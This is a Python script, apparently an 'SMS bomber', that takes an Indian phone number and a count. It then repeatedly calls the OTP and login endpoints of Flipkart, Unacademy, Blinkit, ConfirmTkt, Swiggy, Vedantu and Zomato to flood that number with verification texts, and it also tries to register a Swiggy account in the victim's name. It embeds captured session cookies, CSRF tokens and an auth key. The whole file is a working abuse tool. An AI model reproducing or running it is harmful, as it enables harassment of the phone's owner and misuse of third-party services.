import json
import requests as rq
import random

mobno = input("Enter mobile number: ")
quantity = int(input("Enter no of messages: "))



def flipkart_api():
	url = 'https://1.rome.api.flipkart.com/api/7/user/otp/generate'

	_headers = {
		'Host': '1.rome.api.flipkart.com',
		'User':'Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0',
		'Accept': '*/*',
		'Accept':'Language: en-US,en;q=0.5',
		'Accept':'Encoding: gzip, deflate, br',
		'Content':'Type: application/json',
		'X-User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0 FKUA/website/42/website/Desktop',
		'Origin': 'https://www.flipkart.com',
		'Sec-Fetch-Dest': 'empty',
		'Sec-Fetch-Mode': 'cors',
		'Sec-Fetch-Site': 'same-site',
		'Referer': 'https://www.flipkart.com/',
		'Connection': 'keep-alive',
		'Content-Type': 'application/json',

	}



	data = {"loginId":"+91"+mobno}
	
	request = rq.post(url, headers=_headers, json=data)

	if request.status_code == 200:
		print('Success - Flipkart')
	else:
		print('Failed - Flipkart')



def unacademy_api():
	url = 'https://unacademy.com/api/v3/user/user_check/'



	_headers = {
	'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0',
	'Accept': '*/*',
	'Accept-Language': 'en-US,en;q=0.5',
	'Accept-Encoding': 'gzip, deflate, br',
	'Content-Type': 'application/json',
	'Content-Length': '107',
	'x-platform': '0',
	'Origin': 'https://unacademy.com',
	'Sec-Fetch-Dest': 'empty',
	'Sec-Fetch-Mode': 'cors',
	'Sec-Fetch-Site': 'same-origin',
	'Referer': 'https://unacademy.com/',
	'Connection': 'keep-alive',
	}


	data = {"phone":""+mobno,"country_code":"IN","otp_type":1,"email":"","send_otp":'true',"is_un_teach_user":'false'}

	request = rq.post(url,headers=_headers,json=data)

	if request.status_code == 200:
		print('Success - Unacademy')
	else:
		print('Failed - Unacademy')



def grofers_api():
	url = 'https://blinkit.com/v2/accounts/'

	_headers = {
		'auth_key':'15dbeedc29f8252229be1af586c485065c3c5b8d939d41f8aaae53ff14795b07',
		'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0'
	}

	data = {
		'user_phone':""+mobno
	}


	request = rq.post(url,headers=_headers,data=data)

	if request.status_code == 200:
		print('Success - Grofers')
		return True
	else:
		print('Failed - Grofers')
		return False


def confirmtkt_api():
	url = 'https://securedapi.confirmtkt.com/api/platform/registerOutput?mobileNumber='+mobno+'&newOtp=true&retry=false&testparamsp=true'
	
	requests = rq.get(url)
	
	if requests.json()['smsSent'] == False:
		print('Failed - Confirmtkt')
	else:
		print('Success - Confirmtkt')


def swiggy_api():
	url = 'https://www.swiggy.com/dapi/auth/sms-otp'
	
	_headers = {
	'Host': 'www.swiggy.com',
	'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0',
	'Accept': '*/*',
	'Accept-Language': 'en-US,en;q=0.5',
	'Accept-Encoding': 'gzip, deflate, br',
	'Referer': 'https://www.swiggy.com/',
	'Content-Type': 'application/json',
	'__fetch_req__': 'true',
	'Origin': 'https://www.swiggy.com',
	'Content-Length': '74',
	'Connection': 'keep-alive',
	}

	data = {"mobile":""+mobno,"_csrf":"8Nq9O994FV5N-pweL6TC2U2cGw67V6RKmVbYBE6M"}

	request = rq.post(url,headers=_headers,json=data)

	if request.json()['statusCode'] == 1:
		url = 'https://www.swiggy.com/dapi/auth/signup'

		_headers = {
			'Host': 'www.swiggy.com',
			'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0',
			'Accept': '*/*',
			'Accept-Language': 'en-US,en;q=0.5',
			'Accept-Encoding': 'gzip, deflate, br',
			'Referer': 'https://www.swiggy.com/',
			'Content-Type': 'application/json',
			'__fetch_req__': 'true',
			'Origin': 'https://www.swiggy.com',
			'Content-Length': '165',
			'Connection': 'keep-alive',
		}

		data = {"mobile":""+mobno,"name":"hello","email":"123454321@yahoo.com","password":"123454321","referral":"","otp":"","_csrf":"Y3EUNMSPJWwn-Jrfj6JoXJcCI9jzToqKqcqekwKI"}

		requests = rq.post(url,headers=_headers,json=data)

		print('Success - Swiggy')
	
	elif request.json()['statusCode'] == 0:
		print('Success')

	else:
		print('Failed - Swiggy')

def vedantu_api():
	url = 'https://user.vedantu.com/user/resendPreLoginVerificationOTP'

	_headers = {
		'Host': 'user.vedantu.com',
		'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0',
		'Accept': '*/*',
		'Accept-Language': 'en-US,en;q=0.5',
		'Accept-Encoding': 'gzip, deflate, br',
		'Content-Type': 'application/json',
		'Content-Length': '84',
		'Origin': 'https://www.vedantu.com',
		'Connection': 'keep-alive',
		'Referer': 'https://www.vedantu.com/',
	}

	data = {"email":'null',"phoneCode":"+91","phoneNumber":""+mobno,"ver":"12.104"}

	requests = rq.post(url,headers=_headers,json=data)

	if requests.json()['success'] == True:
		print('Success - Vedantu')
	else:
		print('Failed - Vedantu')

def zomato_api():


	url = 'https://www.zomato.com/webroutes/auth/login'

	_headers = {
		'Host': 'www.zomato.com',
		'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0',
		'Accept': '*/*',
		'Accept-Language': 'en-US,en;q=0.5',
		'Accept-Encoding': 'gzip, deflate, br',
		'Referer': 'https://www.zomato.com/',
		'Content-Type': 'application/json',
		'x-zomato-csrft': '359414b72c3bb80111e76052a1aaf757',
		'Cookie': 'AWSALBTG=mIo1FJV/Azo5KXjgrrbiATjoK+v3JAdQ5mcUe09HiGqYYfndJ1rhl3lkxie7u/El1tDMfSLOypY/96ygyhx6qV116z0NWfJfplYz4luWimqpg/YWmQGfGeA4eiB19odOnheCWfs4HFmF40pk1tNfQeHlsl7/MeBSjstc+tVkxt7f; AWSALBTGCORS=mIo1FJV/Azo5KXjgrrbiATjoK+v3JAdQ5mcUe09HiGqYYfndJ1rhl3lkxie7u/El1tDMfSLOypY/96ygyhx6qV116z0NWfJfplYz4luWimqpg/YWmQGfGeA4eiB19odOnheCWfs4HFmF40pk1tNfQeHlsl7/MeBSjstc+tVkxt7f; PHPSESSID=84fbfc90f6f6c9a1d4662ef57a26e0ec; csrf=359414b72c3bb80111e76052a1aaf757; fbcity=11464; fre=0; rd=1380000; zl=en; fbtrack=011e26a1168ade225bf2a89bbe987216; ltv=11464; lty=11464; locus=%7B%22addressId%22%3A0%2C%22lat%22%3A8.1833%2C%22lng%22%3A77.4119%2C%22cityId%22%3A11464%2C%22ltv%22%3A11464%2C%22lty%22%3A%22city%22%2C%22fetchFromGoogle%22%3Afalse%2C%22dszId%22%3A33562%2C%22fen%22%3A%22Nagercoil%22%7D; _gcl_au=1.1.1100193495.1646824391; _ga=GA1.2.200751515.1646824391; _gid=GA1.2.1261746266.1646824391; _fbp=fb.1.1646824392788.473947926; G_ENABLED_IDPS=google',
		'Origin': 'https://www.zomato.com',
		'Content-Length': '80',
		'Connection': 'keep-alive',
		'Sec-Fetch-Dest': 'empty',
		'Sec-Fetch-Mode': 'cors',
		'Sec-Fetch-Site': 'same-origin',
	}

	data = {"country_id":1,"phone":""+mobno,"verification_type":"sms","method":"phone"}

	requests = rq.post(url,headers=_headers,json=data)

	print('success - zomato')

for x in range(0,quantity):
	flipkart_api()
	unacademy_api()
	grofers_api()
	confirmtkt_api()
	swiggy_api()
	vedantu_api()
	zomato_api()
